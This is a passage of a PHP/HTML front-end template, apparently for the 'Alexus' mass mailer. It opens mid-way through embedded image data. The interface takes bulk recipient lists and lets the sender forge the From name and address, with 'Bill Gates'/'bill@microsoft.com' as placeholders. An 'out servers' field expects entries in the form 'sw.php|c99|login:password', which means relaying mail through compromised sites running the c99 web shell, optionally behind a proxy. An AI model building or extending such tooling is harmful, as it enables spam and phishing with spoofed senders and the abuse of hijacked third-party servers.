WvXCvR46eWOHTsE0iJ27twp2cs5jmnQnDlz0jp37tyiqnJjY2MNpDOCUeN+ghGgx9zLMc9Tzl+xYsUHXEUrWt3AyspqZI8ePVYOGDDgBEjy2MvLSwXCsI5LD0A84e/vTxLJ3IFw/lDYRFGur6+vZWNj44or/BYklrIoNvJqrlu3To4JvCeK0bLvgyvxcHyDtbV1q0pemJmZNXN0dDwNxSpuoAG7d++WnvCbYAhxcBkeJYm4y4uxZzrSEov5XNYARY5kVMY8CzdE4Mbd69KlC2w3blAtf1zAayYBzyuZ81WrVkkvmBreZ4YWrx45T8I+e/ZMXlGSlG8DflOeMlu2bJHll9HgmPNsaqyU6IbXunXrZlJJuYGBgSaq4G2UTxWVr1+/Xm4gGELm7eHDh1IxDSJYMeklCcUcUw7FSBKVlZPsr3gOvxk96kAqMhGFSm1ZHYXoAosMnl0y5wRJyV96RALSU1ZF3hgqrSjHVNFDRoa537x5szRSOYPg2XRm7ty5uVUNYP6tUSrzeGcZBW5esmRJ+eHcyDU2m5ycHNmyWbRoFMcsYnyAsGhRlmCENm3aJFmvXGUQWYUKOL8aB9q1a1cXPIhETSjBgzSra9euMR06dIhetGiR9J7FhaARHJOYNIbllp7zulEJo0M5ytBjEDUNtebi7Nmzc5Cmj4h0OnTp1/gqQlhamJqa2nXs2LE9eWFhYRHE8svcE6zpyq/SKxRUXFPk2Q9wPWNbt27d2MjI6Ofu3bv/am5ubsPG96/vQ0NDwzbw/iEfJuyMJBW9Vko0xxXBZsNSroy5h30Et+YZzjL66lexiYmJLYjzni8kkophpnLkj4/MHF5XzhP8JrGQwlTmnrKc5xVF4fqAQuf21Qa0atXqBxx4Es2lkB6hrqvQuDJ1dXUtevbsGU8lyguHnqK6pTRt2tQca3fYzrmO21OGB+jNtm3bdv5SvWwy9QCW2RYaGho/ocx6oPffQZ3P1tPTm4T5vjAumkTjU41g00GOL2HNUVtbeyKqaTY6Zm779u39NDU1rTDfBuBLuCFQ53PKSQwtoDGVsz4BzJ0pYFWvXj0nKgccdHR0AvAieo+3XSmBf2BKmzdvHoa1IVyvX7/+KC0tLVd8W3zab/TJCL1PRvwjCfnK4XuN9boZew3wI8AwWgM26urq7jDCC+nwAXybNGniDU/HY82eDyTAkjQil4GWQCOgbk1t/G90PLnzsyPYbAAAAABJRU5ErkJggg=="></a></li>
				    </ul>
				    <ul class="nav pull-right">
				    	<li><a href="#" onclick="setLang('ru');return false">
				    		<img alt="русский" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAMAAADXqc3KAAABSlBMVEUAAAD///8AAQEAAQEAAQEAAQEAAQHT09PX19fa2trc3Nze3t7f39/Ozs719fX5+fn8/Pz9/f3+/v7+/v7+/v7+/v7+/v7ExMTz8/P4+Pj7+/v9/f3+/v7Dw8Py8vL4+Pj8/Pz9/f3CwsLw8PD39/f5+fn6+vr7+/sCAsA9Pe08PPU8PPc8PPg8PPkCAr8zM+syMvIyMvUyMvYxMfYCAr0oKOgnJ/AnJ/MnJ/QnJ/QCArslJeYnJ+4nJ/AnJ/EmJvICAroVFeEVFeoVFe0VFe4VFe+4AgLgERHoERHqERHrEBDsEBC2AgLdDQ3lDAzoDAzqDQ21AgLZCAjjCAjmCQnnCQnoCAizAgLXBQXfBQXjBQXkBQXlBQWzBQXVBwfbCAjhEBDjFhbmGxvlHBzmHx/mICDmISG4DAy5EBC9ERHAERHCERHDERHEERHpaBTVAAAAB3RSTlMAAAQMECQwISWBWgAAAGZJREFUKFPNjUEKgDAMBHdr0kP//1dBxdhIW1qoF0FwjjNkA3wPg4JOM+ZgF0ZWqnUOYRoPSlwF+WLXIWwxbwmUvtYHtTvE6dQvAnpK0HdTNVolh9Rsd2DgEsbPpZ4MnAabaic8eFyiFV6rXRgALgAAAABJRU5ErkJggg==" />
				    	</a></li>
				    	<li><a href="#" onclick="setLang('en');return false">
				    		<img alt="english" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAEM0lEQVRIie2Ua0jVZxzHSxJ6YaBBCFFYYtpeNJagjqaDQalbi+zFaGkT5yzWiiajTYsZTXIt87Z5qdkU04aF9ww6HrVjamfaIW/pqSyPnTpXtSzzkqn77Hn+madYbzaKvdkfvi/O7/L5PpffeebN+//777/58xfU79hBl05Hi66LiH3FeH+UiffGLKHsORkM/dStXYva25u+7m7e257/Qj5L6QnbU0R9Rjbn/f3RZmUh2dLApWb3boxpaYz29zM9PU3LNRvHCjtIPtVBSlEHaac7mZn5E3tODraMDGYmJjhZrldysuZoQTuNrXcYLC3FlJ7OiNlMW1ubNHCRBq6+m5O5o2niVkwMQxUVAjaDwfyI2JTLbI2vVSQNDFFR3N66lenRUb460qTEv/yxEX1TJ8bYWOyFhTwZG8M+NEzQp2nSwFUxcHrrO3YmqvmjoQtjfDz3Dh3i6fAwY+OT/FzcSdg3KrGzGW6Hh9MbFsbU48d8kdjAkfyr2MoqMERHMyKOeGpqivbrNvYcqUMyXzD4lpBdpQTvqiTz93bMefn0btvGoytXlKb61rs8fTrFzS1buB4czOTDh9TVdWPcvx9jXBwTAwM8mZwkr6JbYUiWZDoMVu8jKKqYwM9LCIwuJTKhlpsXLnFdrNacnc2k2PakAOhDQugODGTiwQN6IyKwFRQocaPlITsPX1R6JUOyJHPO4KJGw+DgICMjI4wJ2Pj4+CvVGRREu5ikUVH7qrzslQzJ0gjmnEHuokU0rl5Ni48PV4R0/1KyVzIk64STk8MgR/zQrFqFdragVRaLef8nap3tlQzJOiEWPWegVqsxGo0MiMu6f/8+D8QZD4spelFDd+/StGQJWk/Pv+WkZI/slQzJqhFMxyX7fI3bulTcAn8RyuSDmGI69EaGhoa4kZREi58fA+JP2ODqStPy5Up80GqlR4z0ZXEc2oISAiKKlF6FIViS6TDw3ssi/6O4BKQRl1qL1WbH3NNDa2gorRs38lueGmtfH/Vi2w1Ll2K3D5BfplNW21deTqOXFx1x8ez+4bzCkCzJfMnAY306Zao2LBYLvWfO0LBiBVcPHWbz3hI8P/wVy61b1C5cyEVxTFarjYV+6WzfX4mh34RZr0crRrhZTFlR7jnc30952eDdLYnioevE0NuLTrxLGnFRlcfPsnxDNs6+KXgE53Dvxg1Uzs7ULl6MyWRW4lI+m3Kpbe4RMRPtCQlccHdH/VMqb4cedBhUV1fTrlJR4+uLNjKSg8lVCnyZkIQHhJ/CJHagWbmSS2vWYDZbWBF6XMkpNSE5JJ/UKJd7raqKc+LI8j/e5DAoOXCAXA8PTscnsO6TY7j5fT+rBEWrNiTRKKaiwM2NwmXLaGpunss907P69Z+lU3FOhUqYFIq7e27gIuQl9M5rltfz53rBrInra5aLwgbeqN64wV+Rl1Pcwvw+zwAAAABJRU5ErkJggg==" />
				    	</a></li>
				    </ul>
				    
			    </div>
			</div>
			
		</div>	
	</div>
	
	<div class="row section-screen" id="help-screen">
		<div class="span12">
			<div class="well">
				<?php tr('helppage',false);?>
			</div>
		</div>
	</div>
	
	<div class="row section-screen" id="preview-screen">
		<div class="span12">
			<div class="well">
				<h3><?php tr('preview');?></h3>
				<button class="btn prime-button"><?php tr('backtoeditor',false);?></button>
				<iframe src="about:blank" style="width:100%; height:600px;"></iframe>
				<button class="btn prime-button"><?php tr('backtoeditor',false);?></button>
			</div>
		</div>
	</div>
	
	

	
	<div class="row section-screen" id="settings-screen">
		<div class="span12">
			<div class="well">
				<h2><?php tr('settings');?></h2>
				<ul class="nav nav-tabs">
				    <li class="active"><a href="#home-tab"data-toggle="tab"><?php tr('settings-primary')?></a></li>
				    <li><a href="#outservers-tab" data-toggle="tab"><?php tr('settings-outservers')?></a></li>
				    <li><a href="#security-tab" data-toggle="tab"><?php tr('settings-security')?></a></li>
			    </ul>
			    <div class="tab-content">
					<div class="tab-pane active" id="home-tab">
						<?php tr('threadsnum');?><br>
						<div class="btn-group">
							<input type="button" class="btn" onclick="dThreads();" value="<?php tr('less',false);?>"><button class="btn" id="THREADS">4</button><input type="button" class="btn" onclick="iThreads();" value="<?php tr('more',false);?>">		
						</div>
						
						<br><br>
						<?php tr('timeoutlen');?><br>
						<input type="text" class="input-mini" id="TIMEOUT" value="0" style="height:25px; margin-top:10px;"><div id="TIMEOUT_RANGE" min="0" max="3600"></div>
						<br><br>
						<?php tr('settings-history-length')?> <input type="text" class="input-mini" id="maxDoneSize" value="25" style="height:25px; margin-top:10px;">
					</div>
					<div class="tab-pane" id="outservers-tab">
						<input type="checkbox" id="use_out_servers" style="display:none;">
						<button type="button" class="btn btn-danger btn-checkbox" data-toggle="#use_out_servers"><i class="icon-remove"></i></button> <?php tr('useoutservers');?><br><br>
						<?php tr('settings-outservers-doc')?>
						<br>
						<textarea id="out_servers" style="width:100%; height:250px;" placeholder="Пример: http://serv4.ru/sw.php|c99|login:password"></textarea><br>
						<?php tr('settings-outservers-check')?>
						<br><br>
						<div class="progress" id="outprogressbar">
					    	<div class="bar bar-warning" style="width: 0%;"></div>
					    	<div class="barcounter">0/0</div>
					    </div>
					    <?php tr('settings-outservers-check-log')?>
					    <div class="well" id="pingout_log" style="width:860px; height:150px;overflow-y:scroll;"></div>
					</div>
					<div class="tab-pane" id="security-tab">
						<?php 
						$no_write_perm=false;
						clearstatcache();
						if(!is_writable(__FILE__)):
						$no_write_perm=true;
						?>
					    <div class="alert alert-error">
					    <?php tr('settings-security-notwritable')?>
					    </div>
						<?php endif;?>
						<div class="alert alert-success" style="display:none;" id="passchangesuccess">
					    <?php tr('settings-security-password-changed')?>
					    </div>
					    <div class="alert alert-error" style="display:none;" id="passchangeerror">
					    <?php tr('settings-security-password-not-changed')?>
					    </div>
				        <table border=0>
					        <tr>
						        <td><input type="text" id="inputLogin" class="txtinput" placeholder="<?php tr('login',false);?>" <?php if($no_write_perm):?>readonly<?endif;?>></td>
						        <td><input type="text" id="inputPassword" class="txtinput" placeholder="<?php tr('password',false);?>" <?php if($no_write_perm):?>readonly<?endif;?>></td>
					        </tr>
					        <tr>
						        <td>
						        	<button type="button" class="btn" onclick="ChangePass($('#inputLogin').val(),$('#inputPassword').val())" <?php if($no_write_perm):?>disabled<?endif;?>><?php tr('settings-security-set-password')?></button>
							    </td><td>
							        <button type="button" class="btn btn-danger" onclick="ChangePass('','');" <?php if($no_write_perm):?>disabled<?endif;?>><?php tr('settings-security-remove-password')?></button>
						        </td>
					        </tr>
				        </table>
						<br><br>
						<input type="checkbox" id="use_proxy_server" style="display:none;">
						<button type="button" class="btn btn-danger btn-checkbox" data-toggle="#use_proxy_server"><i class="icon-remove"></i></button> <?php tr('settings-security-use-proxy')?><br>
						<input type="text" class="txtinput" id="proxy_server_uri" placeholder="http://proxyserver.ru:8080">
					</div>
				</div>
			</div>
		</div>
	</div>

		
	<div class="row section-screen" id="prime-screen">
		<div class="span3">
			<div id="console" class="well" style="text-align:center;"><?php tr('status');?></div>
			<div id="ext-console" class="well"></div>	
		</div>
		<div class="span9">
			<div class="progress" id="progressbar">
		    	<div class="bar bar-warning" style="width: 0%;"></div>
		    	<div class="barcounter">0/0</div>
		    </div>
		    <div class="well status">
			    <b><?php tr('status');?>: <span class="label label-warning"><?php tr('status-idle');?></span></b>
		    	<div class="controls">
		    	<button class="btn" disabled="disabled" id="ResumeSendMail" onclick="ResumeSendMail()"><i class="icon-play"></i> <?php tr('process-resume');?></button> <button class="btn" disabled="disabled" id="PauseSendMail" onclick="PauseSendMail()"><i class="icon-pause"></i> <?php tr('process-pause');?></button> <button class="btn" disabled="disabled" id="StopSendMail" onclick="StopSendMail()"><i class="icon-stop"></i> <?php tr('process-cancel');?></button>  
		    	</div>
		    </div>
		    <form class="form-horizontal">
				<div class="control-group">
					<label class="control-label" for="inputEmail"><?php tr('recipient');?> [TO-EMAIL]</label>
					<div class="controls">
						<textarea name="to" id="to" class="input-xlarge txtinput" placeholder="vasya@yandex.ru"></textarea>
						<div class="input-append">
							<span class="add-on" onclick="ShowUpload();return false" style="cursor:pointer;"><?php tr('upload');?></span>
						</div>
					</div>
				</div>
				<div class="control-group">
					<label class="control-label" for="inputEmail"><?php tr('fromname');?> [FROM-NAME]</label>
					<div class="controls">
						<textarea name="fromname" id="fromname" class="input-xlarge txtinput" placeholder="Bill Gates"></textarea>
					</div>
				</div>
				<div class="control-group">
					<label class="control-label" for="inputEmail"><?php tr('frommail');?> [FROM-EMAIL]</label>
					<div class="controls">
						<textarea name="frommail" id="frommail" class="input-xlarge txtinput" placeholder="bill@microsoft.com"></textarea>
					</div>
				</div>
				<div class="control-group">
					<label class="control-label" for="inputEmail"><?php tr('replymail');?> [REPLY-EMAIL]</label>
					<div class="controls">
						<textarea name="replymail" id="replymail" class="input-xlarge txtinput" placeholder="my@email.com"></textarea>
					</div>
				</div>
				<div class="control-group">
					<label class="control-label" for="inputEmail"><?php tr('subject');?> [THEME]</label>
					<div class="controls">
						<textarea name="tema" id="tema" class="input-xlarge txtinput" placeholder="<?php tr('subject_example',false);?>"></textarea>
					</div>
				</div>
				<div class="control-group">
					<label class="control-label" for="inputEmail"><?php tr('addfield');?></label>
					<div class="controls">
						<div class="input-prepend">
							<span class="add-on">[ADD0]</span>
						</div>
						<input type="text" name="additional" id="additional0" class="input-xlarge txtinput additional" placeholder="<?php tr('addfield2',false);?>"></textarea>
						<div class="input-append">
							<span class="add-on"><span class="addfield" onclick="AddField(this)">+</span></span>
						</div>
					</div>
				</div>
				<div class="control-group">
					<label class="control-label" for="inputEmail"><?php tr('mailtype');?> (
						<a href="#" rel="tooltip" data-title="<?php tr('plaintext',false);?>">text</a>, 
						<a href="#" rel="tooltip" data-title="<?php tr('withformating',false);?>">html</a>, 
						<a href="#" rel="tooltip" data-title="<?php tr('htmle',false);?>">html(e)</a>)
					</label>
					<div class="controls">
						<select name="type" id="type">
							<option value="html">html</option>
							<option value="htmle">html(e)</option>
							<option value="text">text</option>
						</select>
					</div>
				</div>
				
				
				<div class="btn-group" id="textcontrols">
				    <button id="makebold" onclick="MakeBold();return false" class="btn">B</button>
				    <button id="makeitalic" onclick="MakeItalic();return false" class="btn">I</button>
				    <button id="makeunderline" onclick="MakeUnderline();return false" class="btn">U</button>
				    <button id="makereverse" onclick="MakeReverse();return false" class="btn">esreveR</button>
			    </div>
				<textarea name="text" id="text" style="width:100%;height:200px;"></textarea>
				<button class="btn" onclick="showUniversalUpload();return false"><i class="icon-plus"></i> <?php tr('attachfile');?></button>
				<span id="attachedFiles" class="pull-right"></span>
			</form>
			<div class="pull-left">
				<button class="btn btn-large" onclick="SaveData()"><?php tr('save');?></a>
				<button class="btn btn-large" onclick="TogleLoadSave()"><?php tr('load');?></a>
			</div>
			<div class="pull-right">
				<button class="btn btn-large btn-primary" onclick="Send()"><?php tr('send');?></a>
				<button class="btn btn-large" onclick="Preview()"><?php tr('preview');?></a>
			</div>
		</div>
	</div>
	<div class="row">
		<div class="span12">
			<div class="well" style="text-align:center;">
			&copy; <a href="http://mailer.a-l-e-x-u-s.ru/" target="_blank">Alexus</a> <?php echo date("Y");?>
		</div>
	</di>
</div>
<script src="http://netdna.bootstrapcdn.com/twitter-bootstrap/2.3.0/js/bootstrap.min.js"></script>
</body>
</html>
